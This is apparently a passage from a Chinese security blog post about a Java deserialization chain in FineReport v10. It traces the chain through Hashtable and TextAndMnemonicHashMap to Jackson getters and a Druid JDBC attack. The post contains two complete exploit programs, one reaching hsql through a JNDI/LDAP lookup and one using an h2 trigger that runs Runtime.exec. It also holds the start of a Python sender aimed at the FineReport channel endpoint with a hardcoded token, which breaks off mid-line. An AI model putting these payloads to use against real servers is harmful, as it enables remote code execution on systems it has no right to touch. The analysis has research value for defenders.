<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">druidXADataSource.setUrl(url);</span><br></pre></td></tr></table></figure>

<p>setLogWriter(null)、setStatLogger(null)是因为，在DruidXADataSource的对象被序列化的时候，会递归序列化其所有fields，而其中的logWriter和statLogger并未实现Serializable接口，于是在递归序列化的时候报错NoSerializable，设置成null就不会再判断是否可序列化，也就bypass了</p>
<p>断点打在ObjectOutputStream#1548，条件断点寻找所有未实现Serializable接口的Field：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objVals[i] != null &amp;&amp; (obj.hashCode() == 509886383) &amp;&amp; !(objVals[i] instanceof Serializable)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/88148d3c0a0fb06ce6dfe4928810a7f5.png"></p>
<p>setInitialSize(1)的原因则和反序列化有关，首先测试可以发现，直接调getXConnection()是可以打通的，但是反序列化调用就打不通了，于是开始对比分析：</p>
<p>直接 getXConnection 触发jdbc attack的调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getConnectionInternal:<span class="number">1674</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnectionDirect:<span class="number">1504</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1484</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">main:<span class="number">34</span>, h2Attack (org.example)</span><br></pre></td></tr></table></figure>

<p>而反序列化去触发jdbc attack时，在DruidDataSource#init中，原本在构造函数里初始化了的this.initedLatch变成了null，这导致它在调用await函数时抛出异常<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/13d4416914c282ad6ae1ab5b86649ea7.png"></p>
<p>而如果this.init()过不去，自然就无法执行到this.getConnectionDirect()，也就导致反序列化无法和直接调用getXConnection一样触发jdbc attack，如下图所示<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c98959e2d1453085e954b78c3e29d3f8.png"></p>
<p>解决方案是druidXADataSource.setInitialSize(1)，同样是在this.init()函数里，在调用this.initedLatch.await()之前存在下面的代码段，原本这个while循环因为条件不符直接跳过，但是如果设置了initialSize，则可以执行到this.createPhysicalConnection()，<strong>而这个函数同样可以打jdbc attack</strong>（这里比较奇特，不太清楚怎么发现的）<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/22c4a8d04a1723648cebec9db017ba91.png"></p>
<p>调用栈如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">createPhysicalConnection:<span class="number">1694</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">createPhysicalConnection:<span class="number">1794</span>, DruidAbstractDataSource (com.alibaba.druid.pool)</span><br><span class="line">init:<span class="number">936</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1473</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getConnection:<span class="number">1469</span>, DruidDataSource (com.alibaba.druid.pool)</span><br><span class="line">getXAConnection:<span class="number">42</span>, DruidXADataSource (com.alibaba.druid.pool.xa)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">688</span>, BeanPropertyWriter (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">772</span>, BeanSerializerBase (com.fr.third.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeContents:<span class="number">119</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">79</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">serialize:<span class="number">18</span>, IndexedListSerializer (com.fr.third.fasterxml.jackson.databind.ser.impl)</span><br><span class="line">_serialize:<span class="number">479</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">318</span>, DefaultSerializerProvider (com.fr.third.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4719</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">3964</span>, ObjectMapper (com.fr.third.fasterxml.jackson.databind)</span><br><span class="line">encode:<span class="number">99</span>, EmbedJson (com.fr.json.revise)</span><br><span class="line">encode:<span class="number">560</span>, JSONArray (com.fr.json)</span><br><span class="line">toString:<span class="number">590</span>, JSONArray (com.fr.json)</span><br><span class="line">get:<span class="number">1251</span>, UIDefaults$TextAndMnemonicHashMap (javax.swing)</span><br><span class="line">equals:<span class="number">492</span>, AbstractMap (java.util)</span><br><span class="line">reconstitutionPut:<span class="number">1241</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1215</span>, Hashtable (java.util)</span><br></pre></td></tr></table></figure>

<h4 id="问题二：为什么Map前后put两次"><a href="#问题二：为什么Map前后put两次" class="headerlink" title="问题二：为什么Map前后put两次"></a>问题二：为什么Map前后put两次</h4><p>和CC7类似，textAndMnemonicHashMap在hashtableput的前后put了两次，并且value先异后同</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);  </span><br><span class="line">textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line">...略</span><br><span class="line">hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);  </span><br><span class="line">hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line">...略</span><br><span class="line">textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);  </span><br><span class="line">textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>这样构造本质还是因为hashtable.readObject触发的reconstitutionPut，简单说reconstitutionPut方法就是把一个个反序列化后的Map存入tab，而存入时自然会判断是否有冲突，于是使用hash和equals来做判断，我们利用的也是这个点。</p>
<p>目标是执行到AbstactMap#equals，但在此之前需要判断e.hash和key.hashCode()是否相等，只有相等才能走到equals<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/108a5bbd5d306a242589c7eb4b4daae1.png"></p>
<p>而key.hashCode()实际上就是 key.hash ^ value.hash，而e.hash则是上一个存入tab的textAndMnemonicHashMap1的key.hashCode()，那么想执行equals需要两个entry的key和value一致，这解释payload为什么设置两个null。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fe0573e5365ab908406f5381ca9af935.png"></p>
<p>在设置两个null之前，value先设置成不同的值，则是为避免提前触发链子，因为hashtable在put时会触发同样的equals<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a66400a2ad6bc02c4afa1fd16290a7b.png"></p>
<h4 id="问题三：为什么设置loadFactor"><a href="#问题三：为什么设置loadFactor" class="headerlink" title="问题三：为什么设置loadFactor"></a>问题三：为什么设置loadFactor</h4><p>因为不加会报错，给出了错误提示0.0<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/14b38698a00b7de4312bc7547742e614.png"><br>这个调试一下就知道了，不加loadFactor没办法反序列化&#x3D; &#x3D;<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fc165e18bc3f42368c6c40195f6d647b.png"></p>
<h3 id="HashMap链"><a href="#HashMap链" class="headerlink" title="HashMap链"></a>HashMap链</h3><p>略</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="hsql"><a href="#hsql" class="headerlink" title="hsql"></a>hsql</h3><p>v10的最新版默认内置hsql和jdk8u191，所以考虑打hsql jdbc attack，通过调用Java静态函数lookup去打jndi，然后因为是高版本jdk所以再打ldap反序列化，这样反序列化就不受 blacklist.txt 限制，黑名单里随便找个链子反序列化即可。</p>
<p><strong>坑点：</strong></p>
<ol>
<li>指定的hsql数据库的目录必须存在且有权限写文件，并且之前最好没写过数据</li>
<li>现成工具无法直接利用，因为官方包和fr开头的包不一样，这里魔改 JNDIMap，把fr包打进去实现利用</li>
<li>最新的v10不带BeanUtils了，这里我用的jackson</li>
</ol>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HdqlAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ldapPld</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/Deserialize/FineReportJackson/Command/open .&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;call \&quot;javax.naming.InitialContext.doLookup\&quot;(&#x27;&quot;</span>+ ldapPld + <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:hsqldb:file:/Users/jasper/Downloads/test/&quot;</span>;</span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line"></span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        druidXADataSource.setValidationQuery(query);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line">        druidXADataSource.setDriverClassName(<span class="string">&quot;com.fr.third.org.hsqldb.jdbcDriver&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// druidXADataSource.getXAConnection();</span></span><br><span class="line">        <span class="comment">// 通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">// 即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap的get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;zZ&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">            ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line">        System.out.println(gzipWrapper(payload));</span><br><span class="line"><span class="comment">//        SerializeUtils.unserializeBase64(payload);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d716600ceef9543768c7f24ed3d76387.png"></p>
<h3 id="h2"><a href="#h2" class="headerlink" title="h2"></a>h2</h3><p>h2 jdbc attack直接rce，直接上exp</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidAbstractDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.DruidDataSource;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.druid.pool.xa.DruidXADataSource;</span><br><span class="line"><span class="keyword">import</span> com.fr.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> utils.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> utils.SerializeUtils;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.GZIPOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">h2Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;open -a calculator&#x27;)\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;$$\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">DruidXADataSource</span> <span class="variable">druidXADataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DruidXADataSource</span>();</span><br><span class="line">        druidXADataSource.setLogWriter(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setStatLogger(<span class="literal">null</span>);</span><br><span class="line">        druidXADataSource.setInitialSize(<span class="number">1</span>);</span><br><span class="line">        druidXADataSource.setUrl(url);</span><br><span class="line"><span class="comment">//        druidXADataSource.getXAConnection();</span></span><br><span class="line">        <span class="comment">//通过jackson触发getter即getXAConnection()，JSONArray的toString会调用jackson原生反序列化</span></span><br><span class="line">        <span class="comment">//即writeValueAsString，从而触发getter</span></span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(druidXADataSource);</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">objects</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(arrayList);</span><br><span class="line"><span class="comment">//        objects.toString();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap1</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line">        <span class="type">Map</span> <span class="variable">textAndMnemonicHashMap2</span> <span class="operator">=</span> (Map) ReflectUtils.getUnsafe().allocateInstance(Class.forName(<span class="string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发UIDefaults$TextAndMnemonicHashMap#get方法</span></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="string">&quot;jasper&quot;</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="string">&quot;n1ght&quot;</span>);</span><br><span class="line"></span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidAbstractDataSource.class,<span class="string">&quot;transactionHistogram&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(DruidDataSource.class,<span class="string">&quot;initedLatch&quot;</span>,druidXADataSource,<span class="literal">null</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setClassFieldValue(HashMap.class,<span class="string">&quot;loadFactor&quot;</span>,textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(textAndMnemonicHashMap2,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        textAndMnemonicHashMap1.put(objects,<span class="literal">null</span>);</span><br><span class="line">        textAndMnemonicHashMap2.put(objects,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> SerializeUtils.serializeBase64(hashtable);</span><br><span class="line"><span class="comment">////        System.out.println(payload);</span></span><br><span class="line">        System.out.println(gzipWrapper(payload));</span><br><span class="line">        SerializeUtils.unserializeBase64(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">gzipWrapper</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="comment">// 使用Java反序列化漏洞利用工具生成一个包含恶意代码的序列化对象，并将其序列化成字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] maliciousBytes = bytes;</span><br><span class="line">        <span class="comment">// 构造一个GZIP格式的字节数组，将恶意字节数组存储在GZIP数据块中</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzipOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(baos);</span><br><span class="line">        gzipOutputStream.write(maliciousBytes);</span><br><span class="line">        gzipOutputStream.finish();</span><br><span class="line">        <span class="type">byte</span>[] gzipBytes = baos.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(gzipBytes);</span><br><span class="line">        <span class="keyword">return</span> exp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="发送脚本"><a href="#发送脚本" class="headerlink" title="发送脚本"></a>发送脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">host</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    url = host + <span class="string">&quot;/webroot/decision/remote/design/channel&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">      <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">      <span class="string">&quot;token&quot;</span>: <span class="string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInRlbmFudElkIjoiZGVmYXVsdCIsImlzcyI6ImZhbnJ1YW4iLCJkZXNjcmlwdGlvbiI6ImFkbWluKGFkbWluKSIsImV4cCI6MTcyMzEzNDgxNiwiaWF0IjoxNzIzMTMxMjE5LCJqdGkiOiJpYnFtcVNSek94RmYrQ3JnUzlXeG5NMDdqT3BYVWF4RHV0czMvNGpTKzBqdGlCSzcifQ.x0xKCO4bR6EVGqEoI7W4es7aRWPn5idSTeOYBleBumM&quot;</span>,</span><br><span class="line">      <span class="string">&quot;username&quot;</span>: <span 